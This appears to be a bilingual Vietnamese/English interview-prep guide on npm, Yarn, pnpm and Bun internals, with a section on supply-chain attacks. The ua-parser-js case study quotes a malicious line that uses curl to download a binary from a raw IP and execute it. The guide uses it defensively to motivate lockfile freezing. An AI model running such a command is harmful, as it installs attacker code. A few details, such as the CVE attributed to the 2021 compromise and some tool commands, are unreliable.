# Package Managers Internals — Bên Trong npm / Yarn / pnpm / Bun

> **Track**: FE | **Difficulty**: 🟢 Junior → 🔴 Senior
> **Prerequisites**: Node.js basics, `package.json` familiarity, basic monorepo concepts
> **See also**: [FE System Design README](./README.md) | [Build Tools & Bundlers](./06-build-tools-bundlers.md) | [CI/CD for Frontend](./10-cicd-frontend.md)

---

## Real-World Scenario / Tình Huống Thực Tế

Interviewer hỏi: _"Your CI pipeline takes 8 minutes just installing packages. The new engineer ran `npm install --force` and broke the build. How do you fix both problems — and prevent them from happening again?"_

Hầu hết ứng viên sẽ trả lời: _"Cache node_modules in CI and don't use --force."_ Đây là câu trả lời của Junior. Một Senior Engineer sẽ hỏi ngược: "Which package manager? What's your lockfile policy? Do you have phantom dependencies? Is this a monorepo?" — rồi đưa ra giải pháp có cấu trúc.

**Case studies thực tế:**

- **Vercel (Turborepo + pnpm workspaces)**: Turbo dùng lockfile hash để tạo cache keys, giảm CI install time từ 6 phút xuống còn 45 giây cho monorepo 180 packages. Vercel publish [chi tiết kỹ thuật này năm 2022](https://turbo.build/blog).
- **Microsoft (Rush)**: Microsoft dùng Rush + pnpm cho Windows Terminal, VSCode extensions, và Office Web Apps — scale tới hàng trăm packages trong single monorepo. Rush enforce lockfile policy bằng `rush check` command.
- **Grab Vietnam**: Engineering team migrate từ npm sang pnpm workspace năm 2023, giảm `node_modules` disk usage 60% nhờ content-addressable store và symlink layout.
- **Notion**: Dùng Yarn Berry (v4) với PnP mode cho frontend codebase, loại bỏ hoàn toàn `node_modules` folder — nhưng phải patch nhiều tools không hiểu PnP.
- **Shopee (Sea Group)**: Maintain internal npm registry (Verdaccio-based) mirror tại Singapore và Ho Chi Minh City để giảm latency install từ registry công cộng, đặc biệt với môi trường CI trên-premises.
- **Bun adoption at VN startups**: Nhiều startup Việt Nam (Timo, MoMo frontend teams) thử nghiệm Bun từ Q4 2023 sau stable release tháng 9/2023, báo cáo install speed cải thiện 10–30× so với npm.

Đây là lý do **hiểu internals của package managers** là senior signal: nó phản ánh khả năng debug phantom dependencies, prevent supply-chain attacks, tối ưu CI pipelines — không chỉ biết gõ `npm install`.

---

## What & Why / Cái Gì & Tại Sao

**Package manager** = công cụ quản lý dependencies: download, version resolution, install, và update packages từ registry (npm, GitHub, private mirrors).

```
Tại sao cần hiểu internals?

→ Phantom dependencies: code của bạn import package không có trong package.json — works ngẫu nhiên, breaks khi upgrade
→ Lockfile drift: không có lockfile → mỗi developer có node_modules khác nhau → "works on my machine"
→ Supply-chain attacks: event-stream (2018), colors.js (2022), ua-parser-js (2021) — real CVEs, real damage
→ Monorepo CI: sai cache key strategy → CI install lại toàn bộ mỗi commit → 8+ phút wasted
→ Peer dependency hell: React 18 vs React 17 trong cùng tree → runtime crash khó debug
```

---

## Concept Map / Bản Đồ Khái Niệm

```
PACKAGE MANAGER UNIVERSE 2026
│
├── RESOLUTION
│   ├── semver (^, ~, exact)
│   ├── lockfile (npm: package-lock.json, yarn: yarn.lock, pnpm: pnpm-lock.yaml, bun: bun.lockb)
│   └── registry (npmjs.com, private: Verdaccio, JFrog Artifactory)
│
├── LAYOUT STRATEGIES
│   ├── Flat hoisting (npm 3+, Yarn Classic)  ← phantom deps here
│   ├── Nested (npm 1-2)                       ← disk waste, dep duplication
│   ├── Symlink isolation (pnpm)               ← content-addressable store
│   └── PnP — No node_modules (Yarn Berry)    ← .pnp.cjs resolver
│
├── PACKAGE MANAGERS
│   ├── npm (built-in Node.js, v10 2024)
│   ├── Yarn Classic (v1 — legacy)
│   ├── Yarn Berry (v2–v4, PnP optional)
│   ├── pnpm (v8–v9, fastest + strictest)
│   └── Bun (v1 stable Sep 2023, JS runtime + PM)
│
├── WORKSPACES / MONOREPO
│   ├── npm workspaces (v7+)
│   ├── Yarn workspaces (classic + berry)
│   ├── pnpm workspaces (pnpm-workspace.yaml)
│   └── Orchestrators: Turborepo, Nx, Rush, Lerna (legacy)
│
└── SECURITY
    ├── npm audit / npm audit fix
    ├── Lockfile freeze (npm ci, pnpm --frozen-lockfile)
    ├── socket.dev, Snyk, Dependabot
    └── Package signing (Sigstore / npm provenance 2023)
```

---

## Resolution Algorithm Visualization / Thuật Toán Resolution

```
DEPENDENCY RESOLUTION — Step by Step
─────────────────────────────────────
package.json declares:
  "react": "^18.2.0"
  "next": "^14.0.0"    ← next also depends on react

Step 1: Parse semver ranges
  ^18.2.0 → ">=18.2.0 <19.0.0"
  next@14 declares peerDep: "react": ">=17.0.0"

Step 2: Fetch registry metadata (packument)
  GET https://registry.npmjs.org/react
  → versions: [18.2.0, 18.3.1, 19.0.0-rc.0, ...]
  → latest satisfying ^18.2.0: 18.3.1

Step 3: Resolve dependency graph (BFS)
  root
  ├── react@18.3.1
  │   └── loose-envify@1.4.0
  └── next@14.2.5
      ├── react@18.3.1 (hoisted, shared with root)
      ├── @next/swc-darwin-arm64@14.2.5
      └── postcss@8.4.31

Step 4: Check conflicts
  If react@16 and react@18 both requested → cannot hoist → duplication

Step 5: Write lockfile
  Exact resolved versions + integrity hashes (SHA-512)

Step 6: Download tarballs
  Cache: ~/.npm/_cacache (npm)
         ~/.pnpm-store    (pnpm, content-addressable)
         ~/.bun/install/cache (bun)
```

---

## node_modules Layout Visualizations / Layout node_modules

### npm / Yarn Classic — Flat Hoisting

```
my-app/
└── node_modules/
    ├── react/          ← hoisted (root-level)
    ├── lodash/         ← hoisted
    ├── next/
    │   └── node_modules/
    │       └── (only packages that conflict with root)
    └── some-package/
        └── (no nested node_modules — hoisted to root)

⚠️  PHANTOM DEPENDENCY RISK:
    some-package depends on lodash internally.
    lodash gets hoisted to root.
    Your code can now `import lodash` and it WORKS.
    But lodash is NOT in your package.json.
    → When you remove some-package → lodash disappears → YOUR code breaks!
```

### pnpm — Symlink Isolation

```
my-app/
├── node_modules/
│   ├── .pnpm/                          ← virtual store (content-addressable)
│   │   ├── react@18.3.1/
│   │   │   └── node_modules/
│   │   │       └── react/              ← actual files (hardlinked from global store)
│   │   └── next@14.2.5/
│   │       └── node_modules/
│   │           ├── next/               ← hardlinked
│   │           └── react -> ../../react@18.3.1/node_modules/react  ← symlink
│   ├── react -> .pnpm/react@18.3.1/node_modules/react              ← symlink
│   └── next  -> .pnpm/next@14.2.5/node_modules/next                ← symlink
└── pnpm-lock.yaml

✅  No phantom deps: only packages in package.json are accessible at root
✅  Global store: ~/.pnpm-store stores each file once (content hash)
    → 100 projects using react@18.3.1 → 1 copy on disk, 100 hardlinks
✅  Disk usage: often 60-80% less than npm flat layout
```

### Yarn Berry PnP — No node_modules

```
my-app/
├── .yarn/
│   ├── cache/              ← compressed zip files of packages (.zip)
│   │   ├── react-npm-18.3.1-abc123.zip
│   │   └── next-npm-14.2.5-def456.zip
│   └── releases/
│       └── yarn-4.1.0.cjs
├── .pnp.cjs               ← THE RESOLVER (generated, commit this!)
├── .pnp.loader.mjs
└── package.json

How resolution works WITHOUT node_modules:
  Node `require('react')` → intercepted by .pnp.cjs →
  .pnp.cjs maps 'react' → '.yarn/cache/react-npm-18.3.1-abc123.zip/node_modules/react'
  → Node reads from zip (via virtual FS)

✅  Fastest installs (no filesystem extraction)
✅  Zero disk waste
❌  Tool support: Webpack, Jest, TypeScript, ESLint all need PnP patches
❌  "Zero-installs" (commit .yarn/cache) → repo grows large
❌  Native addons (.node files) cannot live in zip → needs workarounds
```

---

## Comparison Matrix / Bảng So Sánh

| Feature                   | **npm v10**              | **Yarn Classic v1**    | **Yarn Berry v4 PnP**              | **pnpm v9**                              | **Bun v1**              |
| ------------------------- | ------------------------ | ---------------------- | ---------------------------------- | ---------------------------------------- | ----------------------- |
| **Layout**                | Flat hoisted             | Flat hoisted           | No node_modules (PnP)              | Symlink isolated                         | Flat hoisted            |
| **Install speed**         | 🟡 Baseline              | 🟡 ~npm                | 🟢 Very fast (no extract)          | 🟢 Fast (hardlinks)                      | 🟢🟢 10–30× faster      |
| **Lockfile**              | package-lock.json (JSON) | yarn.lock (custom DSL) | yarn.lock (berry format)           | pnpm-lock.yaml                           | bun.lockb (binary)      |
| **Hoisting**              | ✅ Full (phantom risk)   | ✅ Full (phantom risk) | ❌ None (PnP resolver)             | 🟡 Controlled via `public-hoist-pattern` | ✅ Full (like npm)      |
| **Phantom deps**          | ❌ Risk                  | ❌ Risk                | ✅ Prevented                       | ✅ Prevented by default                  | ❌ Risk                 |
| **Disk usage**            | Baseline                 | ~npm                   | ✅ Low (zips, no copies)           | ✅ 60–80% less (hardlinks)               | ~npm                    |
| **Workspace support**     | ✅ v7+                   | ✅                     | ✅ Strong                          | ✅ Best-in-class                         | ✅ Basic                |
| **Registry compat**       | ✅ Full npmjs.com        | ✅                     | ✅                                 | ✅                                       | ✅                      |
| **PnP/IDE support**       | N/A                      | N/A                    | 🟡 Needs config (VSCode ZipFS ext) | N/A                                      | N/A                     |
| **Peer dep auto-install** | ✅ npm v7+               | ❌ Manual              | ❌ Manual                          | 🟡 `auto-install-peers=true`             | ✅                      |
| **Monorepo tooling**      | 🟡 Basic                 | 🟡 Basic               | 🟢 Constraints, focus              | 🟢 Catalogs, filters                     | 🟡 Growing              |
| **License**               | Artistic-2.0             | BSD-2                  | BSD-2                              | MIT                                      | MIT                     |
| **Maintained by**         | npm/Microsoft            | Meta (unmaintained)    | Yarn core team                     | pnpm team                                | Jarred Sumner / Oven.sh |
| **Best for**              | Default, simple projects | Legacy projects        | Zero-installs, strict control      | Large monorepos, disk savings            | Speed-critical dev env  |

---

## Part 1: Lockfile Semantics / Ngữ Nghĩa Lockfile

### Why Lockfiles Exist / Tại Sao Lockfile Tồn Tại

```
WITHOUT lockfile:
  Alice runs npm install → gets react@18.3.0 (latest at Mon)
  Bob runs npm install  → gets react@18.3.1 (latest at Fri, bugfix)
  CI runs npm install   → gets react@18.3.1

  Result: Alice has different runtime than CI → "works on my machine"

WITH lockfile (package-lock.json / yarn.lock / pnpm-lock.yaml):
  First install → resolves + writes exact versions + integrity hashes
  All subsequent installs → reads lockfile → exactly same tree

  react: "^18.2.0" in package.json
  react: "18.3.1" in lockfile (pinned)
  → Every environment gets 18.3.1, no exceptions
```

### Semver Ranges — The Source of Lockfile Need / Semver

```typescript
// package.json semver range semantics:
{
  "dependencies": {
    "react": "^18.2.0",   // caret: >=18.2.0 <19.0.0 (minor+patch updates OK)
    "lodash": "~4.17.0",  // tilde: >=4.17.0 <4.18.0 (patch updates only)
    "zod": "3.22.4",      // exact: only this version
    "next": "*"           // wildcard: any version — NEVER do this in prod!
  }
}

// Caret (^) is npm default — running `npm install react` writes "^18.x.x"
// Tilde (~) is safer — patch updates only
// Exact pinning gives full reproducibility but manual update burden
// Wildcard (*) = dependency hell — avoid completely
```

### `npm install` vs `npm ci` / Khi Nào Dùng Cái Nào

```bash
# npm install — development mode
# - Reads package.json + lockfile
# - Updates lockfile if package.json changed
# - Installs missing packages
# - Allows lockfile mutations
npm install

# npm ci — CI / production mode
# - Reads ONLY lockfile (ignores package.json ranges)
# - Fails if lockfile is missing or out of sync
# - Always does clean install (deletes node_modules first)
# - Never writes to lockfile
# - Faster than npm install in CI (skips resolution)
npm ci

# Equivalents:
# pnpm install --frozen-lockfile   (ci mode)
# yarn install --immutable          (ci mode, Berry)
# yarn install --frozen-lockfile    (ci mode, Classic)
# bun install --frozen-lockfile     (ci mode)

# Rule: Development → npm install | CI/CD → npm ci
```

### Lockfile Merge Conflicts / Xung Đột Khi Merge

```
Scenario: Two branches both add packages → yarn.lock conflict

Branch A: adds axios@1.6.0
Branch B: adds dayjs@1.11.0

Merge conflict in yarn.lock:
<<<<<<< HEAD
axios@^1.6.0:
  version "1.6.0"
  resolved "..."
=======
dayjs@^1.11.0:
  version "1.11.0"
  resolved "..."
>>>>>>> feature/add-dayjs

Solutions by package manager:

1. Yarn Classic: Delete yarn.lock, run `yarn install` to regenerate
   Risk: other packages may upgrade to newer patch versions

2. pnpm: Use pnpm's built-in merge driver
   # .gitattributes
   pnpm-lock.yaml merge=pnpm-lockfile-merge
   # Then: git config merge.pnpm-lockfile-merge.driver "pnpm install --lockfile-only"

3. npm: npm has no merge driver — must regenerate
   Best practice: Always take HEAD, then run `npm install --package-lock-only`

4. npm shrinkwrap: Legacy alternative to package-lock.json
   npm shrinkwrap  → generates npm-shrinkwrap.json (published with package)
   Use case: CLI tools where you want to pin deps for end users
```

---

## Part 2: node_modules Layouts Deep Dive / Layout Chi Tiết

### Flat Hoisting — The Phantom Dependency Problem

```
Problem demonstration:
my-app/
  package.json: { "dependencies": { "next": "^14.0.0" } }

  next@14 depends on → postcss@8.4.31 (internally)
  npm hoists postcss to root → node_modules/postcss/ exists

  Your code (src/styles.ts):
  import postcss from 'postcss'  // ← THIS WORKS! But shouldn't.
  // postcss is NOT in your package.json
  // You have a phantom dependency

  What breaks when you migrate to pnpm:
  → pnpm blocks import of postcss (not in your package.json)
  → Your build fails
  → You must add postcss to your own package.json OR remove the import

Real example at scale (Grab migration story):
  200-package monorepo migrating npm → pnpm
  Found 47 phantom dependencies across packages
  Required 3 days of refactoring to fix imports
  Post-migration: builds are actually more correct — no hidden dep coupling
```

### pnpm's Content-Addressable Store / Global Store

```bash
# pnpm global store location
~/.pnpm-store/v3/
  files/
    00/
      abcdef1234...  ← actual file content (keyed by SHA-512 hash)
    01/
      ...

# How hardlinks save disk space:
Project A: react@18.3.1 → hardlink to ~/.pnpm-store/.../react/index.js
Project B: react@18.3.1 → hardlink to SAME file
Project C: react@18.3.1 → hardlink to SAME file

# Only 1 copy on disk, 3 hardlinks
# ls -li shows same inode number:
$ ls -li node_modules/.pnpm/react@18.3.1/node_modules/react/index.js
1234567 -rw-r--r--  3  ...  index.js
#                   ↑ link count = 3 projects using this file

# Disk savings check:
$ pnpm store status
# Shows: X packages, Y unique files, Z MB saved via hardlinks
```

### Yarn Berry PnP — The Tradeoffs / Đánh Đổi PnP

```javascript
// .pnp.cjs (generated — do NOT edit manually)
// Maps package names → zip archive locations

const RAW_RUNTIME_STATE = {
  packageRegistry: new Map([
    ['react', new Map([
      ['18.3.1', {
        packageLocation: '.yarn/cache/react-npm-18.3.1-abc123.zip/node_modules/react/',
        packageDependencies: new Map([
          ['loose-envify', '1.4.0'],
        ]),
      }],
    ])],
  ]),
};

// Node.js Module resolution is PATCHED by .pnp.cjs
// require('react') → intercepted → mapped to zip path

// VSCode integration: install ZipFS extension
// .vscode/settings.json:
{
  "typescript.tsdk": ".yarn/sdks/typescript/lib",
  "typescript.enablePromptUseWorkspaceTsdk": true
}

// Who actually uses PnP in production?
// ✅ Notion (confirmed 2022 engineering blog)
// ✅ Datadog frontend teams
// ❌ Most companies: tool ecosystem pain too high
//    Jest, Webpack, native addons all need workarounds
```

---

## Part 3: Peer Dependencies / Peer Dependencies

### What Peer Deps Mean / Peer Dependencies Là Gì

```typescript
// Library declares peer dependency:
// package.json of react-query@5
{
  "name": "@tanstack/react-query",
  "peerDependencies": {
    "react": "^17.0.0 || ^18.0.0"
  },
  "peerDependenciesMeta": {
    "react": {
      "optional": false  // required peer dep
    }
  }
}

// What this means:
// react-query does NOT bundle React — it expects YOUR project to provide it
// This prevents 2 copies of React in the same app (would break hooks)

// npm < v7: peer deps ignored (manual install required)
// npm >= v7: peer deps auto-installed (can cause conflicts)
// pnpm: auto-install-peers=true (configurable in .npmrc)
// Yarn Berry: peer deps are warnings, not auto-installed

// Optional peer deps (peerDependenciesMeta.optional: true):
// Example: @emotion/react is optional peer of MUI
// Your app works without it (MUI falls back to plain CSS)
{
  "peerDependenciesMeta": {
    "@emotion/react": { "optional": true },
    "@emotion/styled": { "optional": true }
  }
}
```

### Peer Dep Conflicts — How They Manifest

```bash
# Classic peer dep conflict:
$ npm install react-query@5 --legacy-peer-deps
# ↑ BAD: --legacy-peer-deps ignores peer checks silently
# Runtime may crash with "Invalid hook call" (2 React instances)

# Correct approach: understand the conflict
$ npm install react-query@5
# npm ERR! peer react@"^18" from react-query@5
# npm ERR! node_modules/react-query
# npm ERR!   react-query@"^5" requires a peer of react@"^18" but none is installed
# → Install react@18 explicitly

# Check your peer dep tree:
$ npm ls react
my-app@1.0.0
├── react@17.0.2       ← your version
└── react-query@5.0.0
    └── react@"^18" peer (unmet)  ← CONFLICT

# Resolution: upgrade react to ^18 or use react-query v4 (React 17 compatible)
```

---

## Part 4: Workspaces & Monorepo Installs / Monorepo

### Workspace Configuration by Tool

```yaml
# pnpm-workspace.yaml (pnpm)
packages:
  - 'apps/*'
  - 'packages/*'
  - '!**/__tests__/**'

# package.json (npm workspaces)
{
  "workspaces": ["apps/*", "packages/*"]
}

# package.json (Yarn)
{
  "workspaces": {
    "packages": ["apps/*", "packages/*"],
    "nohoist": ["**/react-native/**"]  # Classic only
  }
}
```

```bash
# pnpm workspace commands
pnpm install                           # Install all workspaces
pnpm --filter @myapp/ui add react      # Add dep to specific workspace
pnpm --filter @myapp/web... build      # Build web + all its deps (topological)
pnpm --filter ...[HEAD^1]... test      # Test only changed packages (Turbo-style)

# npm workspace commands
npm install --workspace=packages/ui
npm run build --workspace=apps/web

# Cross-workspace dependencies (pnpm):
# packages/ui/package.json:
{
  "dependencies": {
    "@myapp/utils": "workspace:*"  # Always use local version
    # workspace:^ → use local, publish with ^ semver
    # workspace:* → use local, publish with exact version
  }
}
```

### Vercel Turborepo + pnpm Integration

```json
// turbo.json — pipeline definition
{
  "$schema": "https://turbo.build/schema.json",
  "pipeline": {
    "build": {
      "dependsOn": ["^build"],
      "outputs": [".next/**", "dist/**"]
    },
    "test": {
      "dependsOn": ["^build"],
      "cache": true
    },
    "lint": {
      "cache": true
    }
  }
}
```

```bash
# CI cache strategy: lockfile hash + node version
# GitHub Actions example:
- name: Get pnpm store directory
  run: echo "STORE_PATH=$(pnpm store path)" >> $GITHUB_ENV

- name: Cache pnpm store
  uses: actions/cache@v4
  with:
    path: ${{ env.STORE_PATH }}
    key: ${{ runner.os }}-pnpm-${{ hashFiles('**/pnpm-lock.yaml') }}
    restore-keys: |
      ${{ runner.os }}-pnpm-

# Key insight: hash the LOCKFILE not package.json
# Lockfile changes = cache bust (correct)
# package.json changes without lockfile change = cache HIT (incorrect if not using --frozen-lockfile)

# Turbo remote cache (Vercel):
turbo build --remote-cache-timeout 60
# → Turbo uploads/downloads build artifacts to Vercel's cache
# → 200-package monorepo: CI time 8min → 45sec (cache hit)
```

### Microsoft Rush — Enterprise Monorepo

```json
// rush.json (top-level)
{
  "rushVersion": "5.120.0",
  "pnpmVersion": "8.15.0",
  "packageManager": "pnpm",
  "projects": [
    { "packageName": "@myapp/core", "projectFolder": "packages/core" },
    { "packageName": "@myapp/ui", "projectFolder": "packages/ui" },
    { "packageName": "web-app", "projectFolder": "apps/web" }
  ]
}
```

```bash
# Rush install (strict, CI-safe)
rush install --purge        # Clean install from lockfile
rush check                  # Verify lockfile consistency across packages
rush build                  # Build with incremental task runner
rush change                 # Enforce changelog for published packages

# Microsoft uses Rush for:
# - VSCode extensions (600k+ lines, 50+ packages)
# - Office Web Apps
# - Windows Terminal shell
# Policy: Rush blocks npm install inside packages — must use rush add
```

---

## Part 5: Registry Mirrors & Private Registries / Registry

### Verdaccio — Self-Hosted Mirror

```yaml
# verdaccio/config.yaml
storage: ./storage
auth:
  htpasswd:
    file: ./htpasswd

uplinks:
  npmjs:
    url: https://registry.npmjs.org/
    timeout: 30s
    max_fails: 3
    fail_timeout: 5m

packages:
  "@mycompany/*":
    # Private packages — no upstream proxy
    access: authenticated
    publish: authenticated

  "**":
    # Public packages — proxy from npmjs
    access: $all
    proxy: npmjs

server:
  keepAliveTimeout: 60

# .npmrc to use Verdaccio:
# registry=http://verdaccio.internal.mycompany.com:4873/
# //verdaccio.internal.mycompany.com:4873/:_authToken=${VERDACCIO_TOKEN}
```

### JFrog Artifactory — Enterprise Registry

```bash
# JFrog Artifactory setup (Enterprise)
# Used by: Shopee, Grab, many VN banks & enterprises

# .npmrc configuration:
registry=https://mycompany.jfrog.io/artifactory/api/npm/npm-local/
//mycompany.jfrog.io/artifactory/api/npm/npm-local/:_auth=${JFROG_AUTH_TOKEN}
always-auth=true

# Advantages over Verdaccio:
# - HA cluster support (active-active)
# - Smart repo routing (local → remote cache → npmjs)
# - Build metadata tracking (which CI build produced which artifact)
# - LDAP/SSO integration
# - License compliance scanning built-in

# Vietnam context:
# Shopee Vietnam: Artifactory mirrors at Singapore + HCMC PoPs
# Reduces install latency from 800ms (npmjs.org) → 80ms (regional mirror)
# JFrog license: Enterprise starts ~$30k/year
```

### 🇻🇳 Vietnam npm Mirror Context

```bash
# npmjs.org latency from Vietnam:
# - Hanoi/HCMC → npmjs (US): 180–400ms per package
# - With CDN/mirror: 20–80ms

# Options for Vietnamese teams:

# 1. Use Cloudflare (npmjs CDN) — already fast enough for most
npm config set registry https://registry.npmjs.org
# npmjs.org is on Cloudflare CDN, VN latency ~100ms

# 2. Self-hosted Verdaccio (for enterprises)
# Host on GCP asia-southeast1 (Singapore) or
# Vietnam-based cloud (VNG Cloud, FPT Cloud)

# 3. Taobao mirror (Chinese teams) — DO NOT use in production
# https://registry.npmmirror.com — may lag npmjs by hours
# Risk: supply-chain attack window (package appears on npmmirror before validation)

# 4. pnpm's global store solves the problem partially:
# Install once → hardlinks for all future projects
# No re-download needed for same version
pnpm config set store-dir /mnt/shared-pnpm-store  # Shared across team via NFS/SMB
```

---

## Part 6: Supply-Chain Attacks / Tấn Công Supply-Chain

### event-stream (2018) — The Original Shock

```
CVE: no formal CVE (not a vulnerability in the traditional sense — malicious intent)
Package: event-stream
Downloads at time: ~2 million/week

Timeline:
  Aug 2018: Dominic Tarr (maintainer) transfers ownership to "right9ctrl" — new contributor
  Sep 2018: right9ctrl adds flatmap-stream@0.1.1 as dependency (suspicious)
  Nov 2018: Developer discovers flatmap-stream contains encrypted payload
             Payload targets: bitcoin wallets in Copay app

Payload analysis:
  // flatmap-stream/index.min.js (obfuscated):
  // Decrypts AES-256-CBC payload using Copay's test code as key
  // Steals private keys from browser localStorage
  // Exfiltrates to attacker's server

Why it worked:
  1. Trusted maintainer transfer (npm had no verification)
  2. Malicious code in transitive dep (not direct dep)
  3. Payload only activated in Copay app context
  4. Event-stream used by 1,628 other packages (transitive blast radius)

Lesson: Your supply chain is only as secure as your weakest transitive dep
```

### colors.js Sabotage (2022) — Intentional Protest

```
Package: colors (npm) + faker (npm)
Maintainer: Marak Squires
Downloads: colors ~20 million/week

Timeline:
  Jan 9, 2022: Marak publishes colors@1.4.44-liberty-2 and faker@6.6.6
                Both contain infinite loop: while(true) { console.log('LIBERTY') }
                Reason: Protest against companies using open-source without paying

Impact:
  Any project with "colors": "^1.4.0" auto-upgraded → build hangs
  aws-cdk, many other tools affected
  GitHub npm advisory: GHSA-5rjg-fvgr-858p

Lesson: Caret (^) ranges in production = trusting maintainer's future decisions
Fix: Pin exact versions for critical deps OR use lockfile (npm ci)

// How to protect:
// 1. Use npm ci (reads lockfile, never upgrades)
// 2. Keep lockfile in git
// 3. Enable Dependabot for controlled upgrades
// 4. Monitor: npm audit, socket.dev
```

### ua-parser-js (2021) — Supply Chain via Account Compromise

```
CVE: CVE-2021-27292
Package: ua-parser-js
Downloads: ~8 million/week (used by Facebook, Microsoft, Apple)

Timeline:
  Oct 22, 2021: Farhad Mammadov's npm account compromised
                Attacker publishes ua-parser-js@0.7.29, 0.7.30, 1.0.0
                Malicious versions contain:
                  - Linux: curl | bash (cryptominer installer)
                  - Windows: schtasks + batch script (cryptominer + password stealer)

// Malicious code injected (simplified):
if (process.platform === 'linux') {
  exec('curl http://159.148.186.228/download/jsextension -o /tmp/jsextension && chmod +x /tmp/jsextension && /tmp/jsextension')
}

Impact duration: ~4 hours before npm yanked the versions
Companies affected: Any using ua-parser-js without lockfile or --frozen-lockfile

Lesson: Production CI MUST use --frozen-lockfile / npm ci
        Never use npm install (allows upgrades) in CI
```

### Defense Strategy / Chiến Lược Phòng Thủ

```bash
# Layer 1: Lockfile freeze in CI (most important)
npm ci                           # Never upgrades
pnpm install --frozen-lockfile
yarn install --immutable

# Layer 2: npm audit in CI pipeline
npm audit --audit-level=high     # Fail CI on high+ severity
npm audit --json | jq '.vulnerabilities | length'

# Layer 3: socket.dev (GitHub App) — proactive analysis
# Analyzes package intent, not just known CVEs
# Catches: new maintainers, suspicious code patterns, network requests
# Used by: Vercel, Linear, Stripe
# Install: github.com/apps/socket-security

# Layer 4: Dependabot automated PRs (GitHub)
# .github/dependabot.yml:
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    ignore:
      - dependency-name: "aws-sdk"
        update-types: ["version-update:semver-major"]

# Layer 5: npm provenance (2023) — package signing via Sigstore
# Packages published with OIDC token from CI (GitHub Actions, GitLab CI)
# Cryptographically links: source repo + commit + CI build → published package
# Verify: npm info react dist.attestations
# Publishers: @angular/core, @aws-sdk, react (npm v10.5+ verification)

# Layer 6: Allowlist critical packages (enterprise)
# .npmrc with Verdaccio/Artifactory:
# - Only whitelisted packages can be installed
# - Security team reviews new packages
# registry=https://internal-registry.mycompany.com
```

---

## Part 7: Dependency Overrides / Override Dependencies

### npm overrides

```json
// package.json — npm overrides (npm v8.3+)
{
  "overrides": {
    // Force ALL uses of lodash to be 4.17.21 (security patch)
    "lodash": "4.17.21",

    // Override only when used by specific parent
    "some-package": {
      "lodash": "4.17.21"
    },

    // Replace vulnerable transitive dep
    "minimist": "^1.2.6"
  }
}
```

### pnpm overrides

```json
// package.json — pnpm overrides
{
  "pnpm": {
    "overrides": {
      "lodash@<4.17.21": "4.17.21",
      "colors": "1.4.0"
    },
    "peerDependencyRules": {
      "ignoreMissing": ["@types/react"],
      "allowedVersions": {
        "react": "18"
      }
    }
  }
}
```

### Yarn resolutions

```json
// package.json — Yarn Classic + Berry
{
  "resolutions": {
    // Force specific version for all matches (glob supported)
    "**/lodash": "4.17.21",
    "ua-parser-js": "0.7.28", // Pin before compromise

    // Berry: package path syntax
    "some-package/lodash": "4.17.21"
  }
}
```

```bash
# When to use overrides:
# 1. Security: CVE in transitive dep, upstream hasn't patched
# 2. Peer dep conflict: 2 packages need incompatible versions of shared dep
# 3. Bug: transitive dep has regression, you need previous version

# Caveat: overrides can mask real incompatibilities
# Always document WHY you added an override:
# "overrides": {
#   "minimist": "^1.2.6"  // CVE-2021-44906, remove when upstream patches
# }
```

---

## Part 8: Yarn Berry PnP Deep Dive / PnP Chi Tiết

### How PnP Works Internally

```javascript
// .pnp.cjs injects itself into Node.js module resolution
// Before: Node.js traverses filesystem looking for node_modules/
// After:  Node.js calls PnP hook for every require()

// PnP Hook (simplified):
Module._resolveFilename = function(request, parent, isMain, options) {
  // Look up request in PnP registry
  const packageLocation = pnpRegistry.findPackageLocation(request, parent);
  if (packageLocation) {
    return path.join(packageLocation, ...);
  }
  // Fallback to original resolution
  return originalResolve(request, parent, isMain, options);
};

// Registry data (generated):
const packageRegistry = new Map([
  [null, new Map([  // null = root package
    [null, {        // null = default version
      packageLocation: './',
      packageDependencies: new Map([
        ['react', '18.3.1'],
        ['next', '14.2.5'],
      ]),
    }],
  ])],
  ['react', new Map([
    ['18.3.1', {
      packageLocation: '.yarn/cache/react-npm-18.3.1-abc123.zip/node_modules/react/',
      packageDependencies: new Map([
        ['loose-envify', '1.4.0'],
      ]),
    }],
  ])],
]);
```

### PnP IDE Integration Pain / Khó Khăn PnP Với IDE

```bash
# Problem: TypeScript language server can't find types
# (node_modules doesn't exist, .yarn/cache has zips)

# Solution: Yarn SDKs
yarn dlx @yarnpkg/sdks vscode   # Generates .yarn/sdks/typescript/
# Then in VSCode: Ctrl+Shift+P → "TypeScript: Select TypeScript Version"
# → Use Workspace Version (points to .yarn/sdks/typescript)

# Problem: ESLint fails (can't resolve plugins)
yarn dlx @yarnpkg/sdks base     # Adds ESLint SDK too

# Problem: Jest fails (can't find modules)
# jest.config.js:
module.exports = {
  resolver: require.resolve('jest-pnp-resolver'),
};

# Problem: Native addons (.node files can't live in zips)
# Solution: Use nativesFirst package linker for specific packages
# .yarnrc.yml:
packageExtensions:
  "some-native-addon@*":
    dependencies:
      "node-gyp": "*"
nodeLinker: pnp
# For native addons specifically:
# yarn config set --home enableGlobalCache true
# Some packages need: "unplugged: true" in .yarnrc.yml to be extracted from zip

# Who uses PnP despite the pain?
# ✅ Notion: 2022 blog post confirms PnP for faster CI
# ✅ Datadog: confirmed at conferences
# ✅ Teams prioritizing strict dep isolation + zero-installs
# ❌ Most teams: ecosystem tooling friction not worth it
```

---

## Part 9: Migrating to pnpm — 200 Packages / Migration Sang pnpm

### Migration Playbook (Grab-style)

```bash
# Step 1: Install pnpm globally
npm install -g pnpm@9

# Step 2: Generate pnpm-lock.yaml from existing package-lock.json
pnpm import  # reads package-lock.json or yarn.lock → pnpm-lock.yaml

# Step 3: Create .npmrc for pnpm settings
cat > .npmrc << 'EOF'
# Hoist only specific packages to root (for tools that don't support PnP)
# Default: nothing hoisted (strict mode)
public-hoist-pattern[]=*eslint*
public-hoist-pattern[]=*prettier*
public-hoist-pattern[]=*jest*

# Auto-install peer deps (npm 7+ behavior)
auto-install-peers=true

# Strict peer deps (breaks on peer conflicts, don't ignore them)
strict-peer-dependencies=false  # Set true after fixing all conflicts

# Symlink store (default is hardlinks — use symlinks on some CI environments)
# virtual-store-dir=.pnpm  # default
EOF

# Step 4: Install and discover phantom deps
pnpm install
# → Will fail on imports of unhoisted packages

# Step 5: Find phantom dependencies
npx pnpify check  # OR manual search:
grep -r "from '[a-z]" src/ | grep -v "from '\." | awk -F"'" '{print $2}' | sort -u > imported_packages.txt
cat package.json | jq '.dependencies | keys[]' > declared_packages.txt
